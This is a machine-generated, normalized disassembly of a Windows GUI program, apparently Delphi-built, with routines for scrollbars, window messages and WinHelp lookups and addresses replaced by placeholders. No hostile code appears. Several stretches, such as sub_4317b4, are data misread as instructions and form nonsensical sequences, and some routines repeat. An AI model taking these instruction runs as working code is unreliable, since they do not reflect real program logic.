mov eax ebx
call sub_42b560
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43df6c
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42b660
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_430ce8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4307b8
mov edx 0x61
mov eax esi
call sub_436f68
mov edx 0x11
mov eax esi
call sub_436f8c
mov dl 0x1
mov eax esi
call sub_43e1a0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_430d54
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403490
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_430d80
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_430e08
retn
mov dl 0x2
call sub_430e08
jmp r-xdata
xor edx edx
call sub_430e08
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_430e08
jmp r-xdata
sub_430e08
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_43e270
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403490
sub_430e5c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_430974
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43ad24
mov eax ebx
mov si 0xffc8
call sub_403490
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_430eb7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5f9d173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
pop ebx
retn
sub_430f00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_430f8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4377ac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44e038
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43d3f0
mov eax ebx
mov si 0xffb8
call sub_403490
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403490
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430f95
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_430fac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439c98
mov edx 0x79
mov eax esi
call sub_436f68
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_436f8c
mov dl 0x1
mov eax esi
call sub_43e1a0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_431064
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43adf8
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43ad24
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_4311a4
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403490
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4310f4
call sub_43714c
mov eax ebx
call sub_43af24
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_43716c
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollInfo
mov eax ebx
call sub_4311a4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_4311a4
push ebx
mov ebx eax
mov eax ebx
call sub_437df0
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_4311c4
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_43b50c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_431200
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_431337
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_43e270
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43133e
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_43e270
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_403490
mov eax ebx
call sub_4311a4
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollPos
jmp r-xdata
sub_43135c
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_43e270
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call SetScrollInfo
sub_431424
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_431449 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_43df6c
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_4311a4
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_403490
mov edx [ esp ]
mov eax ebx
call sub_431348
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_43154c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43df6c
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_43157c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4315a1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4315a8
retn
sub_4316a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4439c8
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4316e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431709
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431710
retn
sub_4317b4
xchg ebp eax
pop ss
inc ebx
add [ edi - 0x56ffbce9 ] bl
pop ss
inc ebx
add [ ebp + 0x17 ] cl
inc ebx
add [ ebp + 0x17 ] dl
inc ebx
add [ ebp + 0x17 ] bl
inc ebx
add [ ebp + 0x17 ] ah
inc ebx
add [ ebp + 0x17 ] ch
inc ebx
add [ ebp + 0x17 ] dh
lahf
pop ss
inc ebx
add [ ecx + 0x4d004317 ] ch
pop ss
cmp dh [ edi + edx + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jne r-xdata
cmp dh [ edi + edx + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ 0x3004317 ] ah
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
pop ss
inc ebx
add [ ebp + 0x17 ] al
inc ebx
add [ ebp + 0x17 ] bh
inc ebx
add [ ebp - 0x72ffbce9 ] al
pop ss
inc ebx
add [ 0x35004317 ] ch
pop ss
inc ebx
add [ 0x45004317 ] bh
pop ss
inc ebp
cmp dh [ edi + edx + 0x200043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
sbb [ ebx ] al
clc
pop ss
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0x18
inc ebx
add [ eax + eax ] ah
add [ eax ] al
lodsb [ esi ]
adc [ eax ] eax
les esi [ eax + eax * 2 ]
add [ edi + edx * 2 ] cl
inc eax
add [ eax ] bl
push edi
inc eax
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ eax ] ch
push edi
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] bh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
enter 0x423f 0x0
sbb al 0x0
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43197d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404050
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040e8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431984
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043d0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4318c8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43197d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404050
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040e8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431984
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043d0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_431998
push ebx
mov ebx eax
mov eax ebx
call sub_431cc8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_40568c
sub_4319d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431a3b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4318c8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431a42
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_431a4c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_431ad4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4319c0
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043d0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431adb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_431ae7
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_431b6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43220c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431b76
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4318c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431af4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_431b6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43220c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431b76
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4318c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431b7c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431c74
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4318c8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
mov eax ebx
call sub_43220c
test al al
je r-xdata
mov ecx sub_43171c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c7b
lea eax [ ebp - 0x1c ]
call sub_404050
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4318c8
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_432164
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_404510
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431ce4
push ebx
mov ebx eax
mov eax ebx
call sub_431cc8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_40568c
pop ebx
retn
mov eax rw-data
call sub_40568c
sub_431d14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_431d6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431d73
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4318c8
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_431d7c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431e72
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408cd0
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4318c8
mov eax ebx
call sub_43220c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431e79
lea eax [ ebp - 0x110 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042c0
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_432164
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042c0
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431e90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_431ef2
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431ef9
lea eax [ ebp - 0x8 ]
call sub_404050
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4318c8
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_431f04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431f84
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4318c8
mov eax ebx
call sub_43220c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431f8b
lea eax [ ebp - 0x4 ]
call sub_404050
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_432164
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_431f94
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43207f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43220c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432086
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404074
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407f48
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_432164
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407f48
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_4040a4
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4318c8
mov eax [ ebp - 0x14 ]
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_432094
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408734
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_4320ef
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408710
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
